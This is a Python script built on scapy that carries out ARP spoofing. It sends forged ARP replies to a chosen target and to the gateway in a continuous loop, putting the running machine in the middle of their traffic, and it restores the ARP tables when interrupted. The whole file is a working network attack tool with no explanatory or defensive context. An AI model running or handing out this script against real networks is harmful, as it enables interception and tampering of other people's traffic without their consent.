#!usr/bin/env python
import scapy.all as scapy
import time
import optparse

def get_argument():
    parser = optparse.OptionParser()
    parser.add_option("-g", "--gateway", dest="gateway", help="ENTER YOUR IP ADDRESS")
    parser.add_option("-t", "--target", dest="target", help="ENTER TARGETS IP ADDRESS")
    (options, argument) = parser.parse_args()
    if not options.gateway:
        parser.error("[-]please specify  gateway ip, use --help or -h for more info")
    elif not options.target:
        parser.error("[-]please specify target ip, use --help or -h for more info")
    return options


def mac(ip):
    request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_request=broadcast/request
    ans_ls= scapy.srp(broadcast_request , timeout=1, verbose=False)[0]
    return ans_ls[0][1].hwsrc


def spoof(target_id, spoof_id):
    target_mac=mac(target_id)
    packet=scapy.ARP(op=2, pdst=target_id, hwdst=target_mac, psrc=spoof_id)
    scapy.send(packet,verbose=False)
def restore(destination_id,source_id):
    destination_mac=mac(destination_id)
    source_mac=mac(source_id)
    packet_res=scapy.ARP(op=2, pdst=destination_id, hwdst=destination_mac,psrc=source_id, hwsrc=source_mac)
    scapy.send(packet_res, count=4, verbose=False)

option = get_argument()
count=0
target_ip = option.target
gateway = option.gateway
try:
    while True:
        spoof(target_ip, gateway)
        spoof(gateway, target_ip)
        count=count+2
        print("\r[+] packets sent:"+str(count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]Detected ctrl+c.....resetting arp......please wait\n")
    restore(target_ip, gateway)
    restore(gateway, target_ip)
